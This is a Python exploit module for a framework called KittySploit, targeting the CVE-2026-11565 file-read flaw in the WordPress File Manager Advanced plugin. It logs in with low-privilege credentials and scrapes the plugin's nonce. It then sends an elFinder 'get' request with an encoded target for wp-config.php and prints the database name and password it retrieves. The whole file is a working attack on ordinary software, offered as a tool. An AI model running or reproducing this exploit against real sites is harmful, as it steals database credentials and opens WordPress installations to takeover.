#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""File Manager Advanced CVE-2026-11565 — fma_load_fma_ui wp-config read."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "File Manager Advanced CVE-2026-11565 file read",
        "description": (
            "Logs in as low-priv user, loads file manager UI nonce, reads wp-config via elFinder target."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-11565"],
        "tags": ["wordpress", "file-manager", "lfi", "authenticated", "cve-2026-11565"],
        "agent": {"approval_required": True},
    }

    path = OptString("/", "WordPress base path", required=False)
    username = OptString("", "WP username (subscriber+ with FM access)", required=True)
    password = OptString("", "WP password", required=True)
    elfinder_target = OptString(
        "l1_d3AtY29uZmlnLnBocA",
        "elFinder target (default wp-config.php volume path)",
        required=False,
    )

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        user = (self.username or "").strip()
        pwd = (self.password or "").strip()
        if not user or not pwd:
            print_error("username and password required")
            return False
        login = self.http_request(
            method="POST",
            path=self._join("/wp-login.php"),
            data={"log": user, "pwd": pwd, "wp-submit": "Log In", "testcookie": "1"},
            allow_redirects=False,
        )
        if not login or "wordpress_logged_in" not in str(login.headers):
            print_error("Login failed")
            return False
        ui = self.http_request(
            method="GET",
            path=self._join("/wp-admin/admin.php"),
            params={"page": "file_manager_advanced_ui"},
            allow_redirects=True,
        )
        m = re.search(r'var afm_object = \{[^}]*"nonce":"([a-f0-9]+)"', ui.text or "") if ui else None
        if not m:
            print_error("afm_object nonce not found")
            return False
        read = self.http_request(
            method="GET",
            path=self._join("/wp-admin/admin-ajax.php"),
            params={
                "action": "fma_load_fma_ui",
                "_fmakey": m.group(1),
                "cmd": "get",
                "target": (self.elfinder_target or "l1_d3AtY29uZmlnLnBocA").strip(),
            },
            allow_redirects=False,
        )
        body = read.text or "" if read else ""
        if read and "DB_NAME" in body and "DB_PASSWORD" in body:
            print_success("wp-config.php content retrieved")
            print_status(body[:800])
            return True
        print_error("File read failed")
        print_status(body[:400])
        return False
